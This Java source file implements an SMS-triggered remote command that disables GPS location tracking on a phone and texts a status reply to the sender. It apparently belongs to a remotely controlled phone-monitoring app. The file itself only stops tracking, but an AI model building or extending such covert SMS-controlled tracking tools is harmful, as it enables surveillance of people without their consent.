package com.vvt.rmtcmd.sms;

import com.vvt.global.Global;
import com.vvt.gpsc.GPSOption;
import com.vvt.info.ApplicationInfo;
import com.vvt.pref.PrefGPS;
import com.vvt.pref.Preference;
import com.vvt.pref.PreferenceType;
import com.vvt.rmtcmd.RmtCmdLine;
import com.vvt.smsutil.FxSMSMessage;
import com.vvt.std.Constant;
import com.vvt.std.Log;
import com.vvt.version.VersionInfo;

public class CmdStopGPS extends RmtCmdSync {
	
	public CmdStopGPS(RmtCmdLine rmtCmdLine) {
		super.rmtCmdLine = rmtCmdLine;
		smsMessage.setNumber(rmtCmdLine.getSenderNumber());
	}
	
	private void doSMSHeader() {
		responseMessage.append(Constant.L_SQUARE_BRACKET);
		responseMessage.append(licenseInfo.getProductID());
		responseMessage.append(Constant.SPACE);
		responseMessage.append(VersionInfo.getFullVersion());
		responseMessage.append(Constant.R_SQUARE_BRACKET);
		responseMessage.append(Constant.L_SQUARE_BRACKET);
		responseMessage.append(smsCmdCode.getGPSCmd());
		responseMessage.append(Constant.R_SQUARE_BRACKET);
		responseMessage.append(Constant.SPACE);
	}
	
	// RmtCommand
	public void execute(RmtCmdExecutionListener observer) {
		smsSender.addListener(this);
		super.observer = observer;
		doSMSHeader();
		try {
			Preference pref = Global.getPreference();
			PrefGPS gps = (PrefGPS)pref.getPrefInfo(PreferenceType.PREF_GPS);
			gps.setEnabled(false);
			int gpsIndex = rmtCmdLine.getGpsIndex();
			if (gpsIndex > 0) {
				GPSOption gpsOpt = gps.getGpsOption();
				gpsOpt.setInterval(ApplicationInfo.LOCATION_TIMER_SECONDS[gpsIndex - 1]);
				gps.setGpsOption(gpsOpt);
			}
			pref.commit(gps);
			responseMessage.append(Constant.OK);
		} catch(Exception e) {
			responseMessage.append(Constant.ERROR);
			responseMessage.append(Constant.CRLF);
			responseMessage.append(e.getMessage());
		}
		smsMessage.setMessage(responseMessage.toString());
		send();
	}
	
	// SMSSendListener
	public void smsSendFailed(FxSMSMessage smsMessage, Exception e, String message) {
		Log.error("CmdStopGPS.smsSendFailed", "Number = " + smsMessage.getNumber() + ", SMS Message = " + smsMessage.getMessage() + ", Contact Name = " + smsMessage.getContactName() + ", Message = " + message, e);
		responseMessage.delete(0, responseMessage.length());
		smsSender.removeListener(this);
		observer.cmdExecutedError(this);
	}

	public void smsSendSuccess(FxSMSMessage smsMessage) {
		responseMessage.delete(0, responseMessage.length());
		smsSender.removeListener(this);
		observer.cmdExecutedSuccess(this);
	}
}